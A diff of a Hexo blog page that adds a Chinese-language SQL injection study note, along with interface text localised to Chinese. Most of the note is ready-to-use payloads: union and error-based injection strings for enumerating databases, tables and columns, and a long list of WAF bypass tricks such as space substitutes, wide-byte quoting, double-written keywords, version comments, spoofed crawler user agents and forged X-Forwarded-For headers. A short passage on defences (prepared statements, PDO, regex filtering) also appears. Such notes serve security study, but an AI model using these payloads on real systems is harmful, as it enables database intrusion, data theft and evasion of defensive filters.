@@ -30,7 +30,7 @@
 
 
   <title>
-haha |
+SQL注入 |
 BLANK = Hexo</title>
 <meta name="generator" content="Hexo 5.4.2"></head>
 <body itemscope itemtype="http://schema.org/WebPage">
@@ -58,15 +58,15 @@ BLANK = Hexo</title>
         <div id="brand">
           <div class="pjax">
           
-  <h1 itemprop="name headline">haha
+  <h1 itemprop="name headline">SQL注入
   </h1>
   
 <div class="meta">
-  <span class="item" title="Created: 2023-04-09 11:33:00">
+  <span class="item" title="创建时间：2023-04-09 11:33:00">
     <span class="icon">
       <i class="ic i-calendar"></i>
     </span>
-    <span class="text">Posted on</span>
+    <span class="text">发表于</span>
     <time itemprop="dateCreated datePublished" datetime="2023-04-09T11:33:00+08:00">2023-04-09</time>
   </span>
 </div>
@@ -77,7 +77,7 @@ BLANK = Hexo</title>
         <nav id="nav">
   <div class="inner">
     <div class="toggle">
-      <div class="lines" aria-label="Toggle navigation bar">
+      <div class="lines" aria-label="切换导航栏">
         <span class="line"></span>
         <span class="line"></span>
         <span class="line"></span>
@@ -100,12 +100,12 @@ BLANK = Hexo</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclgi503lj20zk0m8hdt.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipev1x5e4j20zk0m8b29.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicliwyw55j20zk0m8hdt.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicmnywqgpj20zk0m8dwx.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicitzannuj20zk0m8b29.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicitcxhpij20zk0m8hdt.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipey0a334j20zk0m8qpt.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipey84bjtj20zk0m8hdt.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giciundwu5j20zk0m8n9e.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclxp31goj20zk0m8qv5.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giph4lm9i7j20zk0m84qp.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giciub8ja1j20zk0m81ky.jpg"></li>
         </ul>
       </div>
     </header>
@@ -130,7 +130,7 @@ BLANK = Hexo</title>
     
 <div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
 <i class="ic i-home"></i>
-<span><a href="/">Home</a></span>
+<span><a href="/">首页</a></span>
 </div>
 
     <article itemscope itemtype="http://schema.org/Article" class="post block" lang="chinese">
@@ -149,7 +149,131 @@ BLANK = Hexo</title>
   <div class="body md" itemprop="articleBody">
     
 
-    <p>nihao</p>
+    <h1 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h1><h3 id="1-产生原理（实质）"><a href="#1-产生原理（实质）" class="headerlink" title="1.产生原理（实质）"></a>1.产生原理（实质）</h3><p>1.用户能调控参数（像id=2 union select 1,2,3–+)要能添加代码<br>2.原本数据库只执行（id=2)语句，但执行了用户拼接的一些代码</p>
+<h3 id="2-类型"><a href="#2-类型" class="headerlink" title="2.类型"></a>2.类型</h3><p>1.联合注入<br>        2.堆叠注入<br>        3.宽字节注入<br>        4.cookie注入<br>        5.XFF头注入<br>        6.UA注入（user-agent注入）<br>        7.Referer注入<br>        8.二次注入<br>        9.base64注入<br>        11.万能密码<br>        12.文件读写<br>盲注类型：<br>        1.基于时间的盲注     sleep()   benchmark()<br>        2.基于布尔的注入<br>        3.基于报错的注入     updatexml()  extractvalue()  floor()  exp()</p>
+<h3 id="语言"><a href="#语言" class="headerlink" title="语言"></a>语言</h3><pre><code class="SQL">一，union select
+?id=-2 &#39;   &quot;   )     &#39;)    &quot;)      ]     )]
+order by 3 --+
+union select 1,2,3 --+
+union select 1,database(),3 --+
+union select 1,select group_concat(table_name) from information_schema.tables where table_schema=database(),3 --+
+union select 1,select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name =&quot;&quot;,3--+
+union select 1,select group_concat(id)from users,3 --+
+二，报错注入
+1.and extractvalue(1,concat(0x7e,(database()),0x7e)) --+
+2.and updatexml(1,(concat(0x3a,(database()),0x3a)),1) --+
+0x7e----&gt;~
+0x3a----&gt;:
+三,爆出
+index.php?id=2&#39; and (select 1 from (select count(*),concat(0x3a,0x3a,(database()),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a)b) --+
+</code></pre>
+<h3 id="3-如何防范"><a href="#3-如何防范" class="headerlink" title="3.如何防范"></a>3.如何防范</h3><h4 id="存在哪些风险、对应的对策是什么。"><a href="#存在哪些风险、对应的对策是什么。" class="headerlink" title="存在哪些风险、对应的对策是什么。"></a>存在哪些风险、对应的对策是什么。</h4><blockquote>
+<p>1.预编译  （数据库不会将参数的内容视为SQL命令执行，而是作为一个字段的属性值来处理）</p>
+<blockquote>
+<p>2.PDO预处理                 (本地和Mysql服务端使用字符集对输入进行转义)</p>
+<blockquote>
+<p>3.正则表达式过滤          (如果用户输入了非法信息则利用正则表达式过滤)<br> 4那如何反防范呢？<br>接下来将展示一些绕过的姿势。<br>1.屏蔽or and 空格 注释符<br>or 用|| 或  |<br>and 用&amp;&amp; 或&amp;</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<h3 id="4那如何反防范呢？"><a href="#4那如何反防范呢？" class="headerlink" title="4那如何反防范呢？"></a>4那如何反防范呢？</h3><h4 id="接下来将展示一些绕过的姿势。"><a href="#接下来将展示一些绕过的姿势。" class="headerlink" title="接下来将展示一些绕过的姿势。"></a>接下来将展示一些绕过的姿势。</h4><blockquote>
+<p>替代空格的东西<br>%09 水平tab键<br>%0a 新建一行<br>%0c 新建一页<br>%0d 回车键<br>%0b 垂直tab键<br>%a0 也是空格键</p>
+</blockquote>
+<blockquote>
+<p>屏蔽–+号<br>用 or ‘1’ =’1 代替<br>如<br>?id=2000000’%0aunion%0aselect%0a1,2,3%0a||%0a’1’=’1<br>如果哪天%的空格都不能用，不用空格<br>无空格写法用（）<br>?id=1’||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema)like(database())),0x7e),1))||’1’=’1</p>
+</blockquote>
+<hr>
+<pre><code class="SQL">小知识:
+对&#39; \ 屏蔽，前面多加个\
+数据库用的是gbk编码，会把2个字符当作一个汉字
+如：
+?id=1%df\&#39;（在机器看来这就是个1+字符+&#39;)
+post类
+burp抓包
+在目标位置admin%df%27 union select 1,2 #
+
+常见绕过：
+1.大小写绕过
+Union SelEct
+2.双写绕过
+ununionion
+3.编码绕过
+security--&gt;hex编码
+urlencode
+4.注释符/**/
+uni/**/on sel/**/ect
+5.对于空格绕过
+开头已提过了
+6.对于or and绕过
+and = &amp;&amp;
+or = ||
+7.单引号
+%df%27
+8.反引号
+反引号只能在表名，一般情况下如果表名和语法一样，那么就必须用反引号修饰，否则数据库会误以为这是语法！！！！！！！！！！！！！！！！！！！！！！
+select username,password from `table1` where id=&#39;1&#39; limit 0,1
+where
+select * from `where` where id =1
+9.内联注释
+and /*!select*/ 1,2
+10.&lt;&gt;绕过
+uni&lt;&gt;on sel&lt;&gt;ect
+对了这里加一布尔型的盲注(猜库名
+select * from users where id=1 and ascii(substr(database(),0,1)) &gt; 115
+greatest least
+select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64
+
+
+11.屏蔽逗号
+select substr(&quot;xxxxx&quot;,1,3)
+select substr(&quot;xxxxx&quot; from 1 to 3)
+
+union select 1,2,3
+union select * from (select 1)a join (select 2)b join (select 3)c;
+
+limit 0,1
+limit 0 offset 1
+12.sleep屏蔽
+and sleep(1)
+and benchmark(100000000（0的个数视情况而定）,1);
+13.group_concat屏蔽
+select group_concat(&quot;haha&quot;,&quot;niao&quot;);
+select concat_ws(&quot; &quot;,&quot;haha&quot;,&quot;niao&quot;);
+（把&quot;&quot;放到&quot;haha&quot;,&quot;niao&quot;中间并合并输出）
+14.等号屏蔽
+用 like rlike regexp &lt;&gt;(不等号)?id=1&#39; or 1 like 1
+?id=1&#39; or 1 &lt;&gt; 1
+15.post情况屏蔽#
+id=3&quot;) or 1=1 -- a 使用--空格a可以在post情况下替代#
+16.ip地址拦截（只允许内网访问）
+X-forwarded-for：ip地址
+X-remote-IP：ip地址
+X-Originating-IP：ip地址
+X-remote-addr：ip地址
+X-Real-Ip：ip地址
+(一般放在抓包中间，DNT之后)
+17.修改静态资源
+http://www.xx.com/sql.php?id=1
+可以替换为
+http://www.xx.com/sql.php/1.js?id=1
+18.url白名单
+为了防止防火墙误伤，部分waf(防火墙)内置白名单列表 admin manager system...
+如:
+http://www.xx.com/sql.php/admin.php?id=1
+http://www.xx.com/sql.php?xxxx=/manager/&amp;b=攻击代码
+
+http://www.xx.com/../../../../manager/../sql.php?id=1
+19.爬虫白名单(waf让baidu等搜索引擎蜘蛛能进入)
+伪造自己是搜索引擎（修改user-agent）
+将user-agent改为baidu等一些搜索引擎蜘蛛的user-agent
+20.数据库注释执行
+/*!50001 select * from table1*/;
+如果数据库版本是5.00.01 版本以下的，语句才会执行
+/*!45509 union select */ 1,2,3 --+
+21.增加干扰
+union all %23%a0 select 1,2,3 --+
+</code></pre>
+<h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>有什么想法或心得体会，都可以拿出来分享下。</p>
 
   </div>
 
@@ -160,30 +284,30 @@ BLANK = Hexo</title>
     <span class="icon">
       <i class="ic i-calendar-check"></i>
     </span>
-    <span class="text">Edited on</span>
-    <time title="Modified: 2023-04-09 11:35:13" itemprop="dateModified" datetime="2023-04-09T11:35:13+08:00">2023-04-09</time>
+    <span class="text">更新于</span>
+    <time title="修改时间：2023-04-09 20:50:10" itemprop="dateModified" datetime="2023-04-09T20:50:10+08:00">2023-04-09</time>
   </span>
 </div>
 
       
 <div class="reward">
-  <button><i class="ic i-heartbeat"></i> Donate</button>
-  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
+  <button><i class="ic i-heartbeat"></i> 赞赏</button>
+  <p>请我喝[茶]~(￣▽￣)~*</p>
   <div id="qr">
       
       <div>
-        <img data-src="/images/wechatpay.png" alt="Blank WeChat Pay">
-        <p>WeChat Pay</p>
+        <img data-src="/images/wechatpay.png" alt="Blank 微信支付">
+        <p>微信支付</p>
       </div>
       
       <div>
-        <img data-src="/images/alipay.png" alt="Blank Alipay">
-        <p>Alipay</p>
+        <img data-src="/images/alipay.png" alt="Blank 支付宝">
+        <p>支付宝</p>
       </div>
       
       <div>
-        <img data-src="/images/paypal.png" alt="Blank PayPal">
-        <p>PayPal</p>
+        <img data-src="/images/paypal.png" alt="Blank 贝宝">
+        <p>贝宝</p>
       </div>
   </div>
 </div>
@@ -193,14 +317,14 @@ BLANK = Hexo</title>
 <div id="copyright">
 <ul>
   <li class="author">
-    <strong>Post author:  </strong>Blank <i class="ic i-at"><em>@</em></i>Hexo
+    <strong>本文作者： </strong>Blank <i class="ic i-at"><em>@</em></i>Hexo
   </li>
   <li class="link">
-    <strong>Post link: </strong>
-    <a href="http://example.com/2023/04/09/hello-world/" title="haha">http://example.com/2023/04/09/hello-world/</a>
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2023/04/09/hello-world/" title="SQL注入">http://example.com/2023/04/09/hello-world/</a>
   </li>
   <li class="license">
-    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
   </li>
 </ul>
 </div>
@@ -231,11 +355,12 @@ BLANK = Hexo</title>
 
   <div class="panels">
     <div class="inner">
-      <div class="contents panel pjax" data-title="Contents">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%AC%E5%91%A8%E9%87%8D%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">本周重点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%EF%BC%88%E5%AE%9E%E8%B4%A8%EF%BC%89"><span class="toc-number">1.0.1.</span> <span class="toc-text">1.产生原理（实质）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.0.2.</span> <span class="toc-text">2.类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%AD%E8%A8%80"><span class="toc-number">1.0.3.</span> <span class="toc-text">语言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83"><span class="toc-number">1.0.4.</span> <span class="toc-text">3.如何防范</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%9C%A8%E5%93%AA%E4%BA%9B%E9%A3%8E%E9%99%A9%E3%80%81%E5%AF%B9%E5%BA%94%E7%9A%84%E5%AF%B9%E7%AD%96%E6%98%AF%E4%BB%80%E4%B9%88%E3%80%82"><span class="toc-number">1.0.4.1.</span> <span class="toc-text">存在哪些风险、对应的对策是什么。</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E9%82%A3%E5%A6%82%E4%BD%95%E5%8F%8D%E9%98%B2%E8%8C%83%E5%91%A2%EF%BC%9F"><span class="toc-number">1.0.5.</span> <span class="toc-text">4那如何反防范呢？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%A5%E4%B8%8B%E6%9D%A5%E5%B0%86%E5%B1%95%E7%A4%BA%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E7%9A%84%E5%A7%BF%E5%8A%BF%E3%80%82"><span class="toc-number">1.0.5.1.</span> <span class="toc-text">接下来将展示一些绕过的姿势。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%80%83"><span class="toc-number">1.0.5.2.</span> <span class="toc-text">思考</span></a></li></ol></li></ol></li></ol></li></ol>
       </div>
-      <div class="related panel pjax" data-title="Related">
+      <div class="related panel pjax" data-title="系列文章">
       </div>
-      <div class="overview panel" data-title="Overview">
+      <div class="overview panel" data-title="站点概览">
         <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
   <img class="image" itemprop="image" alt="Blank"
       data-src="/images/avatar.jpg">
@@ -247,7 +372,7 @@ BLANK = Hexo</title>
     <div class="item posts">
       <a href="/archives/">
         <span class="count">1</span>
-        <span class="name">posts</span>
+        <span class="name">文章</span>
       </a>
     </div>
 </nav>
@@ -259,7 +384,7 @@ BLANK = Hexo</title>
   
     
   <li class="item">
-    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
   </li>
 
 
@@ -290,7 +415,7 @@ BLANK = Hexo</title>
         <div class="widgets">
           
 <div class="rpost pjax">
-  <h2>Random Posts</h2>
+  <h2>随机文章</h2>
   <ul>
       
   <li class="item">
@@ -298,13 +423,13 @@ BLANK = Hexo</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/04/09/hello-world/" title="haha">haha</a></span>
+    <span><a href="/2023/04/09/hello-world/" title="SQL注入">SQL注入</a></span>
   </li>
 
   </ul>
 </div>
 <div>
-  <h2>Recent Comments</h2>
+  <h2>最新评论</h2>
   <ul class="leancloud-recent-comment"></ul>
 </div>
 
@@ -320,7 +445,7 @@ BLANK = Hexo</title>
     <span class="author" itemprop="copyrightHolder">Blank @ BLANK</span>
   </div>
   <div class="powered-by">
-    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
   </div>
 </div>
 
@@ -331,16 +456,16 @@ BLANK = Hexo</title>
   var LOCAL = {
     path: '2023/04/09/hello-world/',
     favicon: {
-      show: "（●´3｀●）Goooood",
-      hide: "(´Д｀)Booooom"
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
     },
     search : {
-      placeholder: "Search for Posts",
-      empty: "We didn't find any results for the search: ${query}",
-      stats: "${hits} results found in ${time} ms"
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
     },
     valine: true,fancybox: true,
-    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
     ignores : [
       function(uri) {
         return uri.includes('#');
